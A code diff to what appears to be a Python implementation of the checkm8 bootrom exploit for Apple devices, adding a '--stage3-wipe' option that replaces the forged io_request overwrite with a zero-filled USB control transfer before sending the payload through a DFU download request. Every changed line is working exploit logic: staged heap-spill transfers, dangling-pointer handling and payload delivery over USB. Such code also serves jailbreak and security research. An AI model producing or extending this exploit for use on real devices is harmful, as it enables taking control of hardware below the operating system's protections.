@@ -819,7 +819,18 @@ def stage3(usb, serial_idx, payload, overwrite, spin_us, debug, crit_us=None,
     # (overwrite: SETUP(0x00,0x00,0x40) + 0x80 bytes; payload: SETUP(DNLOAD,
     # wLength=sizeof(payload)) + 0x40 + sizeof(payload) bytes), which is how
     # the Arduino's device-side heap spill is reached.
-    if getattr(stage3, 'sketch_shape', False):
+    if getattr(stage3, 'wipe', 0):
+        n = stage3.wipe
+        # A8-era PC-native checkm8 (checkm8_remote): the 'overwrite' is a
+        # plain zero-filled transfer - the dangling io_request is NULLified
+        # rather than counterfeited.  Fully xHCI-legal (wLength == size).
+        rc = usb.ctrl(handle, 0x00, 0x00, 0, 0, b'\x00' * n, 100)
+        if debug:
+            print('    [debug] overwrite WIPE %d   ctrl rc=%d' % (n, rc))
+        rc = usb.ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, payload, 1000)
+        if debug:
+            print('    [debug] payload OUT        ctrl rc=%d' % rc)
+    elif getattr(stage3, 'sketch_shape', False):
         rc = usb.ctrl(handle, 0x00, 0x00, 0, 0, b'\xcc' * 0x40 + overwrite, 100)
         if debug:
             print('    [debug] overwrite OUT      ctrl rc=%d' % rc)
@@ -937,6 +948,7 @@ def exploit(args):
         live = live2 if live is not None else live
     if args.stage in ('all', '3'):
         stage3.sketch_shape = bool(getattr(args, 'sketch_shape', False))
+        stage3.wipe = int(getattr(args, 'stage3_wipe', 0))
         stage3(usb, serial_idx, payload, overwrite, args.spin_us, args.debug,
                crit_us=getattr(args, 'crit_us', None), live_handle=live)
     serial = verify(usb)
@@ -1162,6 +1174,11 @@ def main():
                         help='do not reset or re-acquire between stages: keep '
                              'talking on the live spray/armed handle (the '
                              'Arduino never re-enumerates)')
+    parser.add_argument('--stage3-wipe', type=lambda x: int(x, 0), default=0,
+                        help='A8-era variant: replace the fake-io_request '
+                             'overwrite with a zero-wipe transfer of N bytes '
+                             '(the dangling io_request is NULLified, not '
+                             'counterfeited - fully xHCI-legal)')
     parser.add_argument('--sketch-shape', action='store_true', default=False,
                         help='emulate the Arduino stage-3 wire exactly: prepend '
                              'the 0xcc pre-packet to the overwrite and payload '
